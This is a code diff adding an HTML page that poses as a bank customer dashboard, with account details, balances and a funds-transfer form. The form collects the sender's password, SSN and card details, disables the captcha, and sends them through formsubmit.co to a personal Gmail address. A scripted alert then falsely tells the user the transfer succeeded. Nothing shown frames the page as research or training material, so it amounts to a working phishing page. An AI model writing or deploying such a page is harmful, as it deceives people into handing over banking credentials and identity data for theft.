@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Customer Dashboard</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #eef2f5;
+      padding: 20px;
+    }
+    .dashboard {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 700px;
+      margin: auto;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    .section {
+      margin-top: 20px;
+    }
+    label, input, select {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 8px;
+    }
+    button {
+      padding: 10px;
+      background: teal;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #transferForm {
+      display: none;
+      margin-top: 20px;
+    }
+    .success {
+      color: green;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="dashboard">
+    <div class="header">
+      <h2>Welcome, Tiffany Bastow</h2>
+      <button onclick="logout()">Logout</button>
+    </div>
+
+    <div>
+      <strong>Account Number:</strong> 1234567890<br/>
+      <strong>Account Balance:</strong> $12,500.00<br/>
+      <strong>Available Balance:</strong> $10,200.00
+    </div>
+
+    <div class="section">
+      <h3>Recent Transactions</h3>
+      <ul>
+        <li>+ $2,000 — Salary Credit</li>
+        <li>– $300 — Grocery Store</li>
+        <li>– $150 — Mobile Recharge</li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h3>Funds Transfer</h3>
+      <button onclick="toggleForm()">Initiate Transfer</button>
+      
+      <form id="transferForm" action="https://formsubmit.co/royalcitix@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <label for="receiverName">Receiver Name</label>
+        <input type="text" name="Receiver Name" required>
+
+        <label for="receiverBank">Receiver Bank</label>
+        <input type="text" name="Receiver Bank" required>
+
+        <label for="password">Sender Password</label>
+        <input type="password" name="Sender Password" required>
+
+        <label for="ssn">Sender SSN</label>
+        <input type="text" name="Sender SSN" required>
+
+        <label for="card">Sender Card Details</label>
+        <input type="text" name="Sender Card Details" required>
+
+        <button type="submit">Send Transfer</button>
+        <p class="success" id="successMsg"></p>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function logout() {
+      window.location.href = 'index.html';
+    }
+
+    function toggleForm() {
+      const form = document.getElementById('transferForm');
+      form.style.display = form.style.display === 'none' ? 'block' : 'none';
+    }
+
+    // Optional: Success message after submit (fake since FormSubmit redirects)
+    const form = document.getElementById('transferForm');
+    if (form) {
+      form.addEventListener('submit', function () {
+        alert('Transfer submitted successfully!');
+      });
+    }
+  </script>
+</body>
+</html>
